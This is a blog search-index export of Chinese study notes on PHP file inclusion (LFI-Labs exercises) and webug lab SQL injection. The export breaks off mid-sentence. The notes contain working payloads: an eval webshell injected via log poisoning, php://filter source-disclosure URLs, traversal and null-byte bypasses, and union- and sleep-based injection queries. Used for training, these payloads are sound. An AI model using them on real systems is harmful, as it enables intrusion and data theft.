<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="File-Inclusion-文件包含漏洞-概述"><a href="#File-Inclusion-文件包含漏洞-概述" class="headerlink" title="File Inclusion(文件包含漏洞)概述"></a>File Inclusion(文件包含漏洞)概述</h1><a id="more"></a><p>文件包含，是一个功能。在各种开发语言中都提供了<code>内置的文件包含函数</code>，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：</p><ul><li>include(),include_once()</li><li>require(),require_once()</li></ul><p>这些文件包含函数，这些函数在代码设计中被经常使用到。</p><p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个<strong>变量</strong>，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：</p><p><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</p><p><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p><p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p><h1 id="B站视频学习记录"><a href="#B站视频学习记录" class="headerlink" title="B站视频学习记录"></a>B站视频学习记录</h1><p>##1、 什么是文件包含漏洞</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602112553701.png" alt="image-20200602112553701"></p><p>##2、 文件包含函数</p><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li><li>highlight_file/show_source/readfile/fopen/file/file_get_contents</li></ul><p>##3、 文件包含漏洞分析</p><ul><li>本地文件包含</li><li>远程文件包含</li></ul><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602113404147.png" alt="image-20200602113404147"></p><h2 id="4、文件包含利用方式"><a href="#4、文件包含利用方式" class="headerlink" title="4、文件包含利用方式"></a>4、文件包含利用方式</h2><h3 id="1、伪协议"><a href="#1、伪协议" class="headerlink" title="1、伪协议"></a>1、伪协议</h3><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602113836299.png" alt="image-20200602113836299"></p><h3 id="2、00截断"><a href="#2、00截断" class="headerlink" title="2、00截断"></a>2、00截断</h3><h3 id="3、长度截断（windows：256-；-linux：4096）"><a href="#3、长度截断（windows：256-；-linux：4096）" class="headerlink" title="3、长度截断（windows：256 ； linux：4096）"></a>3、长度截断（windows：256 ； linux：4096）</h3><h3 id="4、包含日志文件"><a href="#4、包含日志文件" class="headerlink" title="4、包含日志文件"></a>4、包含日志文件</h3><p><strong>包含日志文件获取webshell</strong></p><p>这里使用的是绝对路径，为了演示，没用相对路径</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602212450904.png" alt="image-20200602212450904"></p><p>此时我们写句<code> &lt;?php phpinfo(); ?&gt;</code>,看到服务器返回的是禁止访问，并没有执行，我们再看下日志文件，发现这段代码被url编码了，故而没有是运行</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602212856279.png" alt="image-20200602212856279"></p><p>现在我们用burpsuite来改包试一下，</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602214304112.png" alt="image-20200602214304112"></p><p>此时在浏览器中再次执行第一次的动作，就能运行之前的的php代码了，因为通过burpsuite在日志文件中完整编码的，绕过浏览器的url编码的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;LFI-1&#x2F;&lt;?php @eval($_POST[wlk]); ?&gt; HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure><h3 id="5、包含session"><a href="#5、包含session" class="headerlink" title="5、包含session"></a>5、包含session</h3><h2 id="5-文件包含漏洞的防御"><a href="#5-文件包含漏洞的防御" class="headerlink" title="5 文件包含漏洞的防御"></a>5 文件包含漏洞的防御</h2><ul><li><p>php中使用<code>open_basedir</code>配置限制访问在指定的区域</p></li><li><p>过滤 .（点） / （反斜杠） \ （反斜杠）</p></li><li><p>禁止服务器远程文件包含</p></li><li><p>尽量不要使用动态包含，可以在需要包含的页面固定写好    </p></li></ul><p><strong><em>RFI</em>(远程文件包含)和<em>LFI</em>（本地文件包含漏洞）</strong></p><h2 id="php-filter-非常重要"><a href="#php-filter-非常重要" class="headerlink" title="php://filter(非常重要)"></a>php://filter(非常重要)</h2><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602222614728.png" alt="image-20200602222614728"></p><p><code>http://www.lfi.com/LFI-1/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602224823092.png" alt="image-20200602224823092"></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602224755733.png" alt="image-20200602224755733"></p><h2 id="7-php-input命令执行及其获取webshell"><a href="#7-php-input命令执行及其获取webshell" class="headerlink" title="7 php_input命令执行及其获取webshell"></a>7 php_input命令执行及其获取webshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file, &quot;php:&#x2F;&#x2F;filter&quot;) || stristr($file, &quot;phar:&#x2F;&#x2F;&quot;) || stristr($file, &quot;zip:&#x2F;&#x2F;&quot;) || stristr($file, &quot;data:&quot;))&#123;</span><br><span class="line">    exit(&#39;hacket!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">    if($file!&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)  echo &quot;tips:flag在当前目录的其他位置&quot;;</span><br><span class="line">    include($file);   &#x2F;&#x2F;对应我们在hackbar中的post数据</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;click go baidu&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603001455308.png" alt="image-20200603001455308"></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603002248372.png" alt="image-20200603002248372"></p><p>webshell的获取</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603002512676.png" alt="image-20200603002512676"></p><h2 id="8-php压缩协议获取webshell"><a href="#8-php压缩协议获取webshell" class="headerlink" title="8 php压缩协议获取webshell"></a>8 php压缩协议获取webshell</h2><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003609066.png" alt="image-20200603003609066"></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003504345.png" alt="image-20200603003504345"></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003459676.png" alt="image-20200603003459676"></p><p>这里使用菜单反而无法实现，因为代码的原因在后面自动添加了.php，所以我们在浏览器中需要将.php去掉。如下所示</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003857054.png" alt="image-20200603003857054"></p><h2 id="9-php-data协议获取webshell"><a href="#9-php-data协议获取webshell" class="headerlink" title="9 php-data协议获取webshell"></a>9 php-data协议获取webshell</h2><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603004526194.png" alt="image-20200603004526194"></p><h2 id="10、利用操作系统的特性绕过"><a href="#10、利用操作系统的特性绕过" class="headerlink" title="10、利用操作系统的特性绕过"></a>10、利用操作系统的特性绕过</h2><p>可以利用windows下文件名最多包含256个字符的特点，我们就用文件名+<code>.</code>超过256就行了 </p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603005104123.png" alt="image-20200603005104123"></p><h1 id="LFI-Labs学习记录"><a href="#LFI-Labs学习记录" class="headerlink" title="LFI_Labs学习记录"></a>LFI_Labs学习记录</h1><h2 id="LFI01"><a href="#LFI01" class="headerlink" title="LFI01"></a>LFI01</h2><p><strong>绝对路径</strong></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602161549381.png" alt="image-20200602161549381"></p><p><strong>相对路径 ： ../   表示回到上一层</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们在<code>.php</code>和<code>.txt</code>文件中写入<code>phpinfo()</code>,查看情况</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602162349436.png" alt="image-20200602162349436"></p><p>我们发现，即使文件类型是txt类型的，但是里面包含了php代码，照样是可以运行的，所以与文件类型无关的</p><h2 id="LFI02——-00截断"><a href="#LFI02——-00截断" class="headerlink" title="LFI02——**%00截断**"></a>LFI02——**%00截断**</h2><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line">&lt;!-- from http:&#x2F;&#x2F;www.ush.it&#x2F;2009&#x2F;02&#x2F;08&#x2F;php-filesystem-attack-vectors&#x2F; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;library\&quot;, appends .php to end, escape with NULL byte %00&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-2&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;library&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(&quot;includes&#x2F;&quot;.$_GET[&#39;library&#39;].&quot;.php&quot;); </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用第一关的方法是无效 的，比如我们是<code>?library=c:\\wlk.txt</code>，经过代码后，变成了<code>includes/c:\\wlk.txt.php</code>但是没有这个文件即将会失败</p><p><strong>办法</strong></p><p><strong>%00截断</strong>：还是上面的例子，<code>?library=c:\\wlk.txt%00</code>   =&gt;  <code>includes/c:\\wlk.txt00.php</code>(十六进制是00)   =&gt; <code>includes/c:\\wlk.txt .php</code>(有个空格),于是系统认为文件是``includes/c:\wlk.txt`, 空格.php就不解析了</p><p>但是这里面使用<code>?library=c:\\wlk.txt%00</code>还不行，因为我们的文件是在<code>c:\\wlk.txt·</code>,而不是在<code>includes/c:\\wlk.txt</code>下,故我们使用相对路径来解决这个问题</p><h2 id="LFI03-点加斜杠绕过"><a href="#LFI03-点加斜杠绕过" class="headerlink" title="LFI03-点加斜杠绕过"></a>LFI03-点加斜杠绕过</h2><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- from http:&#x2F;&#x2F;www.ush.it&#x2F;2009&#x2F;02&#x2F;08&#x2F;php-filesystem-attack-vectors&#x2F; --&gt;</span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;file\&quot;, looks for .php at end - bypass by apending &#x2F;. (slash plus dot)&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-3&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;file&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (substr($_GET[&#39;file&#39;], -4, 4) !&#x3D; &#39;.php&#39;)  &#x2F;&#x2F; 从结尾倒数第四个开始，取4个长度</span><br><span class="line"> echo file_get_contents($_GET[&#39;file&#39;]);</span><br><span class="line">else</span><br><span class="line"> echo &#39;You are not allowed to see source files!&#39;.&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602172218555.png" alt="image-20200602172218555"></p><p>我们发现在根目录下使用<code>.php</code>文件将会是失败的，刚好对应上面的源码</p><p>我们看一下在windows下使用<code>.和/</code>来给文件添加名字</p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602172841338.png" alt="image-20200602172841338"></p><p>使用斜杠是，提示我们不能使用<code>\/:*?&quot;&lt;&gt;|</code></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602172930373.png" alt="image-20200602172930373"></p><p><strong>使用<code>.</code></strong></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602173240437.png" alt="image-20200602173240437"></p><p>使用<code>/</code></p><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602173334831.png" alt="image-20200602173334831"></p><h2 id="LFI04-（去掉后缀名绕过）"><a href="#LFI04-（去掉后缀名绕过）" class="headerlink" title="LFI04-（去掉后缀名绕过）"></a>LFI04-（去掉后缀名绕过）</h2><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- from http:&#x2F;&#x2F;www.ush.it&#x2F;2009&#x2F;02&#x2F;08&#x2F;php-filesystem-attack-vectors&#x2F; --&gt;</span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;class\&quot;, appends .php to end, defeat with NULL byte %00&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-4&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;class&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(&#39;includes&#x2F;class_&#39;.addslashes($_GET[&#39;class&#39;]).&#39;.php&#39;);  &#x2F;&#x2F;addslashes转义一些字符 ，可以看到它给我们的文件加上了后缀名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="LFI05-双写绕过"><a href="#LFI05-双写绕过" class="headerlink" title="LFI05-双写绕过"></a>LFI05-双写绕过</h2><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- from http:&#x2F;&#x2F;hakipedia.com&#x2F;index.php&#x2F;Local_File_Inclusion --&gt;</span><br><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;file\&quot;, strips prepended \&quot;..&#x2F;\&quot; strings, must encode &#x2F; with %2f&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-5&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;file&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   $file &#x3D; str_replace(&#39;..&#x2F;&#39;, &#39;&#39;, $_GET[&#39;file&#39;]);  &#x2F;&#x2F; 过滤了..&#x2F;</span><br><span class="line">   if(isset($file))</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;pages&#x2F;$file&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;index.php&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602181507963.png" alt="image-20200602181507963"></p><h2 id="LFI06"><a href="#LFI06" class="headerlink" title="LFI06"></a>LFI06</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- from https:&#x2F;&#x2F;pentesterlab.com&#x2F;exercises&#x2F;php_include_and_post_exploitation&#x2F;course --&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the POST parameter \&quot;page\&quot;&quot;);  ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-6&#x2F;index.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;page&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include($_POST[&quot;page&quot;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里使用的是<code>POST</code>方式传数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602183608333.png" alt="image-20200602183608333"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00截断： escape with NULL byte %00</span><br><span class="line">    </span><br><span class="line">点+斜杠绕过</span><br><span class="line">    </span><br><span class="line">去掉后缀名绕过</span><br><span class="line">    </span><br><span class="line">双写绕过    比如过滤了..&#x2F;</span><br><span class="line">    </span><br><span class="line">文件包含shell</span><br><span class="line">    </span><br><span class="line">包含日志文件获取webshell</span><br><span class="line"></span><br><span class="line">php_filter获取flag</span><br><span class="line"></span><br><span class="line">php_input命令执行及获取webshell</span><br><span class="line">    </span><br><span class="line">php压缩协议获取webshell</span><br><span class="line">   </span><br><span class="line">php-data协议获取webshell</span><br><span class="line">    </span><br><span class="line">利用操作系统特性进行文件包含</span><br></pre></td></tr></table></figure><h2 id="日志目录"><a href="#日志目录" class="headerlink" title="日志目录"></a><strong>日志目录</strong></h2><p><strong>日志默认目录</strong></p><ul><li><code>apache+Linux</code>日志默认路径：<code>/etc/httpd/logs/access_log</code>     或者   <code>var/log/httpd/access_log</code></li><li><code>apache + win2003</code>日志默认路径： <code>D:\xampp\apache\logs\access.log</code>     <code>D:\xampp\apache\logs\error.log</code></li><li><code>ISS6.0 + WIN2003</code>默认日志文件： <code>C:\WINDOWS\system32\Logfiles</code></li><li><code>ISS7.0 + WIN2003</code>默认日志文件： <code>%SystemDrive%\inetpub\logs\LogFiles</code></li><li><code>nginx</code>日志文件： 日志文件在用户安装目录logs目录下，例如：安装目录为 <code>/usr/local/nginx</code>，则日志在<code>/usr/local/nginx/logs</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 文件包含漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webug靶场</title>
      <link href="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1 SQL注入"></a>1 SQL注入</h1><a id="more"></a><p><strong>查库信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># mysql</span><br><span class="line"></span><br><span class="line">select schema_name frome information_schema.schemata;</span><br><span class="line">select table_name from information_schema.tables where table_schema &#x3D; &quot;库名&quot;;</span><br><span class="line">select column_name from information_schema.colums where table_name &#x3D; &quot;表名&quot;;</span><br><span class="line">select 列名 from 库名.表名;</span><br><span class="line"></span><br><span class="line">select * from user order by 2;   &#x2F;&#x2F;表示按照第二列进行排序</span><br></pre></td></tr></table></figure><p><strong>order by 用法</strong></p><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518114506666.png" alt="image-20200518114506666"></p><p>使用 order by 4的时候出现了错误，这样一来我们知道了有多少列的信息了</p><p><strong>union 联合查询</strong></p><p>##1 显错注入</p><p>注释：<code>--+、-- （有一个空格）、#（推荐使用）   </code>前面两个由于传参问题可能有问题的</p><p>group_concat（）函数</p><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518123301882.png" alt="image-20200518123301882"><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518123318366.png" alt="image-20200518123318366"></p><ol><li><pre><code>http://192.168.1.178/control/sqlinject/manifest_error.php?id=1 打开之后的链接http://192.168.1.178/control/sqlinject/mhanifest_error.pp?id=1 ‘  发生报错3http://192.168.1.178/control/sqlinject/manifest_error.php?id=1’--+ 根据提示，此时我们得到注入点http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ order by 2--+ 使用order by 语句得知，一共存在两列。http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,2--+ 我们发现网页中，2被显示了出来。http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1, group_concat(schema_name) from information_schema.schemata--+  查库==》information_schema,mysql,performance_schema,test,webug,webug_sys,webug_width_bytehttp://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1, database()--+查询当前使用的数据库==》webughttp://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’webug‘ --+ 查询webug库下的所有表：==》data_crud,env_list,env_path,flag,sqlinjection,user,user_testhttp://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag‘ --+ 查看flag表中的列  ==》id,flaghttp://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,flag from webug.flag --+ 查询flag的字段值==》dfafdasfafdsadfa&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## 2 知识点补充&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;if()函数if(A&gt;B,C,D);解释： 如果 A&gt;B 成立，则返回 C，否则返回 D；例： select if(1&gt;2,3,4);</code></pre></li></ol><p>length();  显示长度<br>例：select length(database())&gt;1;<br>结合使用：<br>select if((length(database())&gt;1),1,sleep(5));<br>如果当前的数据库长度大于1，则返回1，否则睡眠5s；<br>select if((select length(schema_name) from information_schema.schemata 